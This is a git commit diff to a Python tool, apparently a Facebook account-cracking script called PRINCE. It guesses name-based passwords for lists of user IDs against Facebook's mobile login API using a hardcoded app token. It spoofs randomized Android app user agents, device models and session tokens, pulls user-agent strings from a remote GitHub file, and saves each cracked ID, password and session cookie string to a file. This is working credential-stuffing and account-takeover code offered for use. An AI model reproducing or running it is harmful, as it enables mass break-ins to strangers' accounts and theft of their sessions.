3e8ec63f9d5006af016788d5309259f55a5ab018
Shadid21 <76004861+Shadid21@users.noreply.github.com>
2024-02-29 20:44:39 +0600

    Add files via upload

--- PRINCE.py
+++ PRINCE.py
@@ -43,6 +43,30 @@ class sort:
         cx = random.choice(co)
         return cx
 
+ua = []
+
+def live_update():
+    try:
+        url = "https://github.com/Shadid21/Fuck-Clone/blob/main/database"
+        buffer = BytesIO()
+        curl = pycurl.Curl()
+        curl.setopt(curl.URL, url)
+        curl.setopt(curl.WRITEDATA, buffer)
+        curl.setopt(curl.CAINFO, certifi.where())
+        curl.perform()
+        curl.close()
+        datax = buffer.getvalue().decode('utf-8').splitlines()[0]
+        for u in datax.split("|"):
+            ua.append(u)
+    except:
+        sys.exit("[!!] Internet Error...")
+
+
+live_update()
+
+
+
+
 
 def info():
     sort.clear()
@@ -158,7 +182,45 @@ def Samsung():
         random.choice(range(1500, 2000))) + "};FB_FW/1;]"
     return ua
 
-
+def dd(fbbd, device):
+    if fbbd.lower() == "samsung":
+        return random.choice(
+            ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
+             "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F",
+             "SM-J210F", "SM-N9005", "SM-J210F"])
+    elif fbbd.lower() == "vivo":
+        return random.choice(["vivo 1935", "V3Max"])
+    elif fbbd.lower() == "motorola":
+        return random.choice(
+            ['Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G',
+             'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s',
+             'Moto G5s Plus', 'Moto G6', 'Moto X', 'moto g power (2021)'])
+    elif fbbd.lower() == "oppo":
+        return random.choice(["CPH" + str(random.choice(range(1000, 2000))), "oppo r7sm"])
+    elif fbbd.lower() == "oneplus":
+        return random.choice(["A0001", "OnePlus 11R", "OnePlus 10T", "OnePlus Nord 3 5G"])
+    elif fbbd.lower() == "google":
+        return random.choice(["Pixel 6a", "Pixel 3"])
+    elif fbbd.lower() == "asus":
+        return random.choice(["ASUS_X01BDA", "ASUS_Z01QD", "ASUS_I005DC", "NX55", "MXB48T"])
+    elif fbbd.lower() == "huawei":
+        return random.choice(
+            ["DUB-LX1", "AGS2-L09", "POT-LX1", "DRA-LX2", "POT-LX3", "VOG-L29", "EVR-N29", "FIG-LX1", "Kirin Treble",
+             "HUAWEI LUA-L21", "ATU-L31", "COL-L29", "NAM-LX9", "VOG-L29", "JKM-LX1", "RNE-L22"])
+    elif fbbd.lower() == "lenovo":
+        return random.choice(
+            ["Lenovo TB-X505F", "Lenovo A6020a46", 'PAFR0026IN', 'PAFR0026', 'PAFR0033IN', 'PAFR0033', 'PAFR0013IN',
+             'PAFR0013', 'PAGW0015IN', 'L39051', 'XT2091-8'])
+    elif fbbd.lower() == "sony":
+        return random.choice(
+            ["C2105", "C2104", "G3312", "G3311", "G3313", "LT29i", "D6503", "D6502", "SO-03F", "Xperia Z2", "D6503",
+             "D6502", "SO-03F", "Xperia Z2", "D6563", "D6603", "D6653", "D6616", "D6643", "SO-01G", "SOL26", "D6646",
+             "D5803", "D5833", "SO-02G", "D6633", "D6603", "D6643", "D6653", "D6616", "D6683", "SGP621", "SGP611",
+             "E6533", "D6708"])
+    elif fbbd.lower() == "tecno":
+        return random.choice(["CG8", "CG8h", "LB8", "LB8a", "CH7n", "CH7", "LH6n"])
+    else:
+        return device
 # -----------#
 def Motorola():
     fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
@@ -205,6 +267,35 @@ def referer():
 
 
 # -----------#
+def generate_random_string(lowercase_count, numeric_count):
+    lowercase_chars = string.ascii_lowercase
+    numeric_chars = string.digits
+
+    lowercase_part = ''.join(random.choices(lowercase_chars, k=lowercase_count))
+    numeric_part = ''.join(random.choices(numeric_chars, k=numeric_count))
+
+    return lowercase_part + numeric_part
+
+def shuffle_string(s):
+    shuffled_list = list(s)
+    random.shuffle(shuffled_list)
+    return ''.join(shuffled_list)
+
+lowercase_count = 16
+numeric_count = 18
+
+low = 10
+num = 22
+
+ran_string = generate_random_string(low, num)
+shuffled_cid = shuffle_string(ran_string)
+
+random_string = generate_random_string(lowercase_count, numeric_count)
+shuffled_connection_token = shuffle_string(random_string)
+
+
+
+
 
 
 def old():
@@ -263,7 +354,7 @@ def filee():
     ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
     if ask in ["1", "01", "a", "A"]:
         print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND File Clone")
-        print(sort.line())
+        print(sort .line())
         time.sleep(2)
         pwx = ["07860786", "57575751", "57575752", "57273200", "59039200", "first123", "first 123", "first1234",
                "First123", "First1234", "first@123", "first last", "First Last", "firstlast", "firstlast123",
@@ -309,11 +400,16 @@ def filee():
             pwx.append(px)
     else:
         print(sort.line())
-    print("[b]    [red1][1] [spring_green1]Method 1")
-    print("[b]    [red1][2] [spring_green1]Method 2")
-    print("[b]    [red1][3] [spring_green1]Method 3")
-    print("[b]    [red1][4] [spring_green1]Method 4")
-    print("[b]    [red1][5] [spring_green1]Method 5")
+    print("  [r dark_olive_green1]Π1[/r dark_olive_green1][b violet] Method 1")
+    print("  [r dark_olive_green1]Π2[/r dark_olive_green1][b violet] Method 2")
+    print("  [r dark_olive_green1]Π3[/r dark_olive_green1][b violet] Method 3")
+    print("  [r dark_olive_green1]Π4[/r dark_olive_green1][b violet] Method 4")
+    print("  [r dark_olive_green1]Π5[/r dark_olive_green1][b violet] Method 5")
+    print("  [r dark_olive_green1]Π6[/r dark_olive_green1][b violet] Method 6")
+    print("  [r dark_olive_green1]Π7[/r dark_olive_green1][b violet] Method 7")
+    print("  [r dark_olive_green1]Π8[/r dark_olive_green1][b violet] Method 8")
+
+
     print(sort.line())
     meth = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
 
@@ -335,7 +431,6 @@ def filee():
 def file_sub(uid, pwx, name, meth, file):
     global oks, loop, sys_ua
     Session = requests.session()
-    shadid = random.choice(sys_ua)
     custom_agent = ""
     try:
         sys.stdout.write(
@@ -352,18 +447,47 @@ def file_sub(uid, pwx, name, meth, file):
                                                                                                           ls).replace(
                 'Name', name).replace('name', name.lower())
 
-            if meth in ["1", "01"]:
-                agent = shadid
-            elif meth in ["2", "02"]:
-                agent = Vivo()
-            elif meth in ["3", "03"]:
-                agent = Motorola()
-            elif meth in ["4", "04"]:
-                agent = Samsung()
+            if meth in ["a", "A", "1"]:
+                uax = ua[0]
+            elif meth in ["b", "B", "2"]:
+                uax = ua[1]
+            elif meth in ["c", "C", "3"]:
+                uax = ua[2]
+            elif meth in ["d", "D", "4"]:
+                uax = ua[3]
+            elif meth in ["e", "E", "5"]:
+                uax = ua[4]
+            elif meth in ["f", "F", "6"]:
+                uax = ua[5]
+            elif meth in ["g", "G", "7"]:
+                uax = ua[6]
             else:
-                agent = custom_agent
+                uax = ua[7]
+            try:
+                rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
+                device = uax.split("FBDV/")[1].split(";")[0]
+                plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
+                                      "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
+                fban = uax.split("FBAN/")[1].split(";")[0]
+                fbpn = uax.split("FBPN/")[1].split(";")[0]
+                fbav = uax.split("FBAV/")[1].split(";")[0]
+                fbbd = uax.split("FBBD/")[1].split(";")[0]
+                model = dd(fbbd, device)
+                fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
+                    random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
+                androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
+                    random.choice(["2", "1", "0"]))
+                nowandroidv = uax.split("Android ")[1].split(";")[0]
+                useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
+                    nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
+                    fbav, fbverson).replace(device, model)
+            except:
+                useragent = uax
+                model = uax.split("FBDV/")[1].split(";")[0]
+            token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
+            adi = str(uuid.uuid4())
             data = {
-                "adid": str(uuid.uuid4()),
+                "adid": adi,
                 "format": "json",
                 "device_id": str(uuid.uuid4()),
                 "cpl": "true",
@@ -373,7 +497,7 @@ def file_sub(uid, pwx, name, meth, file):
                 "source": "device_based_login",
                 "email": uid,
                 "password": ps,
-                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                "access_token": token,
                 "generate_session_cookies": "1",
                 "meta_inf_fbmeta": "",
                 "advertiser_id": str(uuid.uuid4()),
@@ -385,21 +509,21 @@ def file_sub(uid, pwx, name, meth, file):
                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                 "api_key": "882a8490361da98702bf97a021ddc14d"}
             head = {
-                'User-Agent': agent,
+                'User-Agent': useragent,
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Host': 'graph.facebook.com',
                 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                 'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                 'X-FB-Connection-Type': 'MOBILE.LTE',
                 'X-Tigon-Is-Retry': 'False',
-                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                'X-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid={shuffled_cid}',
                 'X-fb-device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
                 'X-FB-Client-IP': 'True',
                 'X-FB-Server-Cluster': 'True',
-                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', }
+                'X-fb-connection-token': f'{shuffled_connection_token}', }
             url1 = 'https://b-graph.facebook.com/auth/login'
             po = Session.post(url=url1, data=data, headers=head, allow_redirects=False).json()
 
@@ -407,15 +531,15 @@ def file_sub(uid, pwx, name, meth, file):
                 oks.append(uid)
                 coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                 print(
-                    f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/pyc_file.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
+                    f"\r\r[reverse white][PRINCE-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
+                open("/sdcard/SD-FILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 break
             elif "Please Confirm Email" in str(po):
                 oks.append(uid)
                 coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                 print(
-                    f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/pyc_file.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
+                    f"\r\r[reverse white][PRINCE-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
+                open("/sdcard/SD-FILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 break
             else:
                 continue
